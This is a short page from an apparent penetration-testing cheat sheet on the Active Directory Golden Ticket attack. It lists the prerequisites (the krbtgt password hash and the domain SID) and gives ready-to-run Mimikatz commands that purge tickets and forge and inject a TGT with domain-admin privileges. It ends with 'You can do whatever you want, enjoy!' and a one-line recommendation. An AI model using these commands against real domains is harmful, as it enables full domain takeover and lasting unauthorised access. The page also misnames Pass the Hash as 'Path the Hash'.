---
layout: default
title: Golden Tickets
parent: Active Directory
nav_order: 7
permalink: /ad/golden/
---

# Golden Tickets
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

Kerberos authentication protocol involves an Active Directory Key Distribution Service which uses a service account named `krbtgt`. If you manage to retrieve the password hash of this service account, you would be able to create Keberos TGT with highest privileges possible on the targeted domain with Path the Hash method.

## Prerequisites

* Having the password hash of `krbtgt` domain user.
* Having the targeted domain SID.

## Exploit

```bash
# With Mimikatz, purge tickets in your current session.
kerberos::purge

# Forge the golden ticket for your user.
kerberos::golden /user:<$username> /domain:<$domain> /sid:<$domain_sid> /krbtgt:<$hash> /ptt
```

Your user is now in the most privileged group in the Active Directory, including Domain Admins. You can do whatever you want, enjoy!

{: .warning }
> If you want to connect remotely to a machine, **use the hostname, not the IP.** Golden Tickets attack consists in leveraging Kerberos authentication by performing Overpass The Hash. If you specify the IP of the target, you’ll force NTLM authentication, which will fail.

## Recommendations

- [ ] Nothing to do here, simply don't disclose `krbtgt` hash.